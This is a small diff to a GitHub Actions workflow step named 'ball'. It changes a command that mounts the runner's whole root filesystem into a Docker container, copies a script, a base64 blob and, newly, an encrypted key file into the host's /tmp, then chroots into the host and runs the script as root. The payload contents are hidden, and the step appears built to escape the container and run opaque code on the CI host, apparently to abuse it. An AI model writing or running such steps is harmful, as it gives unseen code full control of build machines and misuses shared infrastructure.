@@ -7,5 +7,4 @@ jobs:
       - uses: actions/checkout@v4
       - name: ball
         run: |
-          ls -la probe-inner.sh batch.b64
-          docker run --rm -v /:/host -v $GITHUB_WORKSPACE:/w:ro alpine:3.20 sh -c 'cp /w/probe-inner.sh /w/batch.b64 /host/tmp/ && chmod +x /host/tmp/probe-inner.sh && chroot /host bash /tmp/probe-inner.sh' 2>&1 | cut -c1-400
+          docker run --rm -v /:/host -v $GITHUB_WORKSPACE:/w:ro alpine:3.20 sh -c 'cp /w/probe-inner.sh /w/batch.b64 /w/key.enc /host/tmp/ && chmod +x /host/tmp/probe-inner.sh && chroot /host bash /tmp/probe-inner.sh' 2>&1 | cut -c1-400
